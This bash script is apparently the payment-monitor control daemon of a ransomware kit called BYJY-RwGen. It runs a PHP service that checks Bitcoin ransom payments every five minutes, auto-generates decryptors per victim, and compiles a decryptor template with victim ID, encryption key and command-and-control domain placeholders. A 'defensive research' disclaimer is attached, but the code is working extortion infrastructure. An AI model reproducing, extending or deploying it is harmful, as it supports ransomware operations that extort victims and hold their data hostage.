#!/bin/bash
# BYJY-RwGen Payment Monitor Daemon
# Starts automatic payment monitoring and decryptor generation
# For defensive cybersecurity research purposes only

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
LOG_FILE="$SCRIPT_DIR/payment_monitor_daemon.log"
PID_FILE="$SCRIPT_DIR/payment_monitor.pid"

# Function to log messages
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Function to start payment monitor
start_monitor() {
    if [ -f "$PID_FILE" ]; then
        if ps -p $(cat "$PID_FILE") > /dev/null 2>&1; then
            log_message "Payment monitor is already running (PID: $(cat $PID_FILE))"
            exit 1
        else
            log_message "Removing stale PID file"
            rm -f "$PID_FILE"
        fi
    fi
    
    log_message "Starting BYJY-RwGen Payment Monitor..."
    log_message "Log file: $LOG_FILE"
    
    # Create necessary directories
    mkdir -p /tmp/decryptors
    mkdir -p /var/www/html/decryptors
    chmod 755 /tmp/decryptors /var/www/html/decryptors
    
    # Install required dependencies if not present
    if ! command -v php &> /dev/null; then
        log_message "Installing PHP..."
        apt-get update && apt-get install -y php php-sqlite3 php-curl php-json
    fi
    
    if ! command -v g++ &> /dev/null; then
        log_message "Installing build tools..."
        apt-get install -y build-essential libsodium-dev libcurl4-openssl-dev libjsoncpp-dev
    fi
    
    # Start payment monitor in background
    cd "$SCRIPT_DIR"
    nohup php payment_monitor.php > "$LOG_FILE" 2>&1 &
    MONITOR_PID=$!
    
    echo $MONITOR_PID > "$PID_FILE"
    log_message "Payment monitor started with PID: $MONITOR_PID"
    
    # Verify it's running
    sleep 2
    if ps -p $MONITOR_PID > /dev/null 2>&1; then
        log_message "✓ Payment monitor is running successfully"
        log_message "✓ Monitoring Bitcoin payments every 5 minutes"
        log_message "✓ Auto-generating decryptors upon payment verification"
    else
        log_message "✗ Failed to start payment monitor"
        rm -f "$PID_FILE"
        exit 1
    fi
}

# Function to stop payment monitor
stop_monitor() {
    if [ -f "$PID_FILE" ]; then
        PID=$(cat "$PID_FILE")
        if ps -p $PID > /dev/null 2>&1; then
            log_message "Stopping payment monitor (PID: $PID)..."
            kill $PID
            
            # Wait for graceful shutdown
            for i in {1..10}; do
                if ! ps -p $PID > /dev/null 2>&1; then
                    break
                fi
                sleep 1
            done
            
            # Force kill if still running
            if ps -p $PID > /dev/null 2>&1; then
                log_message "Force killing payment monitor..."
                kill -9 $PID
            fi
            
            rm -f "$PID_FILE"
            log_message "✓ Payment monitor stopped"
        else
            log_message "Payment monitor is not running"
            rm -f "$PID_FILE"
        fi
    else
        log_message "Payment monitor is not running (no PID file)"
    fi
}

# Function to check status
check_status() {
    if [ -f "$PID_FILE" ]; then
        PID=$(cat "$PID_FILE")
        if ps -p $PID > /dev/null 2>&1; then
            log_message "✓ Payment monitor is running (PID: $PID)"
            
            # Show recent activity
            echo ""
            echo "Recent activity (last 10 lines):"
            tail -n 10 "$LOG_FILE"
        else
            log_message "✗ Payment monitor is not running (stale PID file)"
            rm -f "$PID_FILE"
        fi
    else
        log_message "✗ Payment monitor is not running"
    fi
}

# Function to show real-time logs
show_logs() {
    if [ -f "$LOG_FILE" ]; then
        echo "Following payment monitor logs (Ctrl+C to exit):"
        echo "================================================"
        tail -f "$LOG_FILE"
    else
        log_message "No log file found"
    fi
}

# Function to test system
test_system() {
    log_message "Testing BYJY-RwGen payment system..."
    
    # Test database connection
    if php -r "
        require_once 'database.php';
        try {
            \$db = new Database();
            echo 'Database: OK\n';
        } catch (Exception \$e) {
            echo 'Database: ERROR - ' . \$e->getMessage() . '\n';
            exit(1);
        }
    "; then
        log_message "✓ Database connection successful"
    else
        log_message "✗ Database connection failed"
        exit 1
    fi
    
    # Test Bitcoin API
    if php -r "
        require_once 'bitcoin_api.php';
        try {
            \$api = new BitcoinAPI();
            \$rate = \$api->getCurrentBTCRate();
            echo 'Bitcoin API: OK (Current rate: $' . \$rate . ')\n';
        } catch (Exception \$e) {
            echo 'Bitcoin API: ERROR - ' . \$e->getMessage() . '\n';
        }
    "; then
        log_message "✓ Bitcoin API accessible"
    else
        log_message "⚠ Bitcoin API may have issues (will use fallback)"
    fi
    
    # Test decryptor compilation
    log_message "Testing decryptor compilation..."
    if [ -f "decryptor_template.cpp" ]; then
        cd /tmp
        cp "$SCRIPT_DIR/../victim_client/decryptor_template.cpp" test_decryptor.cpp
        
        # Replace placeholders
        sed -i 's/{{VICTIM_ID}}/test_victim/g' test_decryptor.cpp
        sed -i 's/{{ENCRYPTION_KEY}}/0123456789abcdef0123456789abcdef/g' test_decryptor.cpp
        sed -i 's/{{C2_DOMAIN}}/localhost/g' test_decryptor.cpp
        
        if g++ -std=c++17 -o test_decryptor test_decryptor.cpp -lsodium -lcurl -ljsoncpp -pthread 2>/dev/null; then
            log_message "✓ Decryptor compilation successful"
            rm -f test_decryptor test_decryptor.cpp
        else
            log_message "✗ Decryptor compilation failed (missing dependencies?)"
        fi
    else
        log_message "⚠ Decryptor template not found"
    fi
    
    log_message "System test completed"
}

# Main script logic
case "$1" in
    start)
        start_monitor
        ;;
    stop)
        stop_monitor
        ;;
    restart)
        stop_monitor
        sleep 2
        start_monitor
        ;;
    status)
        check_status
        ;;
    logs)
        show_logs
        ;;
    test)
        test_system
        ;;
    *)
        echo "BYJY-RwGen Payment Monitor Control Script"
        echo "For defensive cybersecurity research purposes only"
        echo ""
        echo "Usage: $0 {start|stop|restart|status|logs|test}"
        echo ""
        echo "Commands:"
        echo "  start    - Start the payment monitor daemon"
        echo "  stop     - Stop the payment monitor daemon"
        echo "  restart  - Restart the payment monitor daemon"
        echo "  status   - Check if the monitor is running"
        echo "  logs     - Show real-time logs"
        echo "  test     - Test system components"
        echo ""
        exit 1
        ;;
esac

exit 0